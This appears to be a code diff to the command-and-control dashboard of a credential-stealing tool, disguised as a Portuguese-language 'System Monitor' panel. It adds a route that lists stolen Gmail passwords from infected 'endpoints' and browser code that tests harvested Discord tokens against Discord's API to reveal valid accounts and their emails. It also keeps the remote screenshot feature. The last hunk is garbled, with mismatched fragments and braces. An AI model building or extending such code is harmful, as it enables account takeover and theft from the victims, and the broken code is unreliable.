@@ -220,6 +220,26 @@ def receive_full_report():
     except Exception as e:
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
+@app.route('/api/check_gmails/<endpoint_id>', methods=['GET'])
+def check_gmails(endpoint_id):
+    try:
+        # Busca senhas do endpoint
+        passwords = endpoint_passwords.get(endpoint_id, {}).get('passwords', [])
+        
+        # Filtra apenas Gmails
+        gmails = [p for p in passwords if p.get('service') == 'Gmail' or 'gmail.com' in p.get('url', '')]
+        
+        return jsonify({
+            'status': 'success',
+            'gmails': gmails,
+            'total': len(gmails)
+        })
+    except Exception as e:
+        return jsonify({
+            'status': 'error',
+            'message': str(e)
+        }), 500
+
 @app.route('/api/screenshot', methods=['POST', 'OPTIONS'])
 def receive_screenshot():
     if request.method == 'OPTIONS':
@@ -658,13 +678,13 @@ HTML_TEMPLATE = """<!DOCTYPE html>
     </style>
 </head>
 <body>
-    <canvas id="particles-canvas"></canvas>
-    <div class="container">
+        <canvas id="particles-canvas"></canvas>
         <div class="header">
             <h1>System Monitor</h1>
-            <p>Painel de Monitoramento Completo</p>
+            <p>Painel de Monitoramento Avançado</p>
         </div>
-
+        
+        <div class="container">
         <div class="stats-grid">
             <div class="stat-card">
                 <div class="stat-value" id="totalEndpoints">0</div>
@@ -780,6 +800,34 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         initParticles();
         animateParticles();
 
+        // Configuração
+        const API_BASE = window.location.origin;
+        
+        // Função de validação de tokens
+        async function validateToken(token) {
+            try {
+                const response = await fetch(`https://discord.com/api/v10/users/@me`, {
+                    headers: {
+                        'Authorization': token
+                    }
+                });
+                
+                if (response.ok) {
+                    const user = await response.json();
+                    return {
+                        valid: true,
+                        username: user.username,
+                        id: user.id,
+                        discriminator: user.discriminator,
+                        email: user.email || 'N/A'
+                    };
+                }
+                return { valid: false };
+            } catch (error) {
+                return { valid: false };
+            }
+        }
+        
         // Variáveis globais
         let currentEndpoint = null;
         let endpointsData = {};
@@ -867,6 +915,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                         <div class="card-actions">
                             <button class="btn-dados" onclick="openDataModal('${e.id}', '${e.hostname}')">📊 Ver Todos</button>
                             <button class="btn-dados" onclick="requestScreenshot('${e.id}')">📸 Screenshot</button>
+                            <button class="btn-dados" onclick="checkGmails('${e.id}')">📧 Gmails</button>
                         </div>
                     `;
                     container.appendChild(card);
@@ -914,7 +963,10 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             modalContent.innerHTML = `
                 <div class="data-section">
                     <h3>🔑 Tokens (${tokens.length})</h3>
-                    ${tokens.length > 0 ? tokens.map(t => `<div class="token-card">${t.token || t}</div>`).join('') : '<div class="empty-state">Nenhum token encontrado</div>'}
+                    ${tokens.length > 0 ? `
+                        <div id="tokenValidationStatus">Validando tokens...</div>
+                        <div id="tokenList">${tokens.map(t => `<div class="token-card" data-token="${t.token || t}">${t.token || t}</div>`).join('')}</div>
+                    ` : '<div class="empty-state">Nenhum token encontrado</div>'}
                 </div>
                 
                 <div class="data-section">
@@ -932,10 +984,94 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     ${files.length > 0 ? files.map(f => `<div class="token-card"><strong>Nome:</strong> ${f.name || f.filename}<br><strong>Tamanho:</strong> ${f.size ? (f.size / 1024).toFixed(2) + ' KB' : 'N/A'}</div>`).join('') : '<div class="empty-state">Nenhum arquivo encontrado</div>'}
                 </div>
             `;
+            
+            // Valida tokens após abrir o modal
+            if (tokens.length > 0) {
+                validateTokensInModal();
+            }
         }
 
         function closeModal() {
             document.getElementById('dataModal').style.display = 'none';
+        }
+        
+        async function validateTokensInModal() {
+            const tokenCards = document.querySelectorAll('.token-card');
+            const statusDiv = document.getElementById('tokenValidationStatus');
+            let validCount = 0;
+            
+            statusDiv.textContent = 'Validando tokens...';
+            
+            for (let i = 0; i < tokenCards.length; i++) {
+                const card = tokenCards[i];
+                const token = card.getAttribute('data-token');
+                
+                card.style.background = 'rgba(59, 130, 246, 0.1)';
+                card.innerHTML = `${token}<br><small>Validando...</small>`;
+                
+                try {
+                    const validation = await validateToken(token);
+                    
+                    if (validation.valid) {
+                        card.style.background = 'rgba(34, 197, 94, 0.1)';
+                        card.style.border = '1px solid #22c55e';
+                        card.innerHTML = `
+                            <strong>✅ VÁLIDO</strong><br>
+                            ${token}<br>
+                            <small>👤 ${validation.username}#${validation.discriminator}</small><br>
+                            <small>📧 ${validation.email}</small>
+                        `;
+                        validCount++;
+                    } else {
+                        card.style.background = 'rgba(239, 68, 68, 0.1)';
+                        card.style.border = '1px solid #ef4444';
+                        card.innerHTML = `
+                            <strong>❌ INVÁLIDO</strong><br>
+                            ${token}
+                        `;
+                    }
+                } catch (error) {
+                    card.style.background = 'rgba(239, 68, 68, 0.1)';
+                    card.style.border = '1px solid #ef4444';
+                    card.innerHTML = `
+                        <strong>❌ ERRO</strong><br>
+                        ${token}
+                    `;
+                }
+                
+                // Pequeno delay para não sobrecarregar a API
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+            
+            statusDiv.innerHTML = `<strong>Validação concluída: ${validCount}/${tokenCards.length} tokens válidos</strong>`;
+        }
+        
+        async function checkGmails(endpointId) {
+            try {
+                // Mostra loading
+                const btn = event.target;
+                const originalText = btn.textContent;
+                btn.textContent = '🔄 Buscando...';
+                btn.disabled = true;
+                
+                const response = await fetch(`/api/check_gmails/${endpointId}`);
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    alert(`📧 Gmails encontrados: ${data.gmails.length}\n\n${data.gmails.slice(0, 3).map(g => `• ${g.username}@gmail.com`).join('\n')}${data.gmails.length > 3 ? `\n... e mais ${data.gmails.length - 3}` : ''}`);
+                    
+                    // Atualiza o endpoint para mostrar os Gmails
+                    loadEndpoints();
+                } else {
+                    alert('❌ Erro ao buscar Gmails: ' + data.message);
+                }
+            } catch (error) {
+                alert('❌ Erro na requisição');
+            } finally {
+                // Restaura botão
+                btn.textContent = originalText;
+                btn.disabled = false;
+            }
         }
 
         async function loadScreenshots() {
@@ -978,33 +1114,18 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             }
         }
 
-        async function requestScreenshot(endpointId) {
-            const id = endpointId || currentEndpoint;
-            if (!id) {
-                alert('Selecione um endpoint primeiro');
-                return;
-            }
-
-            try {
-                const response = await fetch(`/api/request_screenshot/${id}`, { method: 'POST' });
-                const result = await response.json();
-
-                if (result.status === 'success') {
-                    alert(`Screenshot solicitado para ${id}!`);
-                    setTimeout(() => {
-                        loadScreenshots();
-                    }, 5000);
-                } else {
-                    alert(`Erro: ${result.message}`);
-                }
-            } catch (error) {
-                alert('Erro ao solicitar screenshot');
-            }
+        if (Object.keys(screenshots).length === 0) {
+            container.innerHTML = '<div style="color: #6b7280;">Nenhuma screenshot encontrada</div>';
         }
+    } catch (error) {
+        console.error('Error loading screenshots:', error);
+    }
+}
 
-        async function loadAllData() {
-            // Carrega endpoints primeiro
-            await loadEndpoints();
+function selectEndpoint() {
+    const select = document.getElementById('endpointSelect');
+    currentEndpoint = select.value;
+    const btn = document.getElementById('screenshotBtn');
             
             // Depois carrega dados de cada endpoint
             const endpoints = await fetch('/api/endpoints').then(r => r.json());
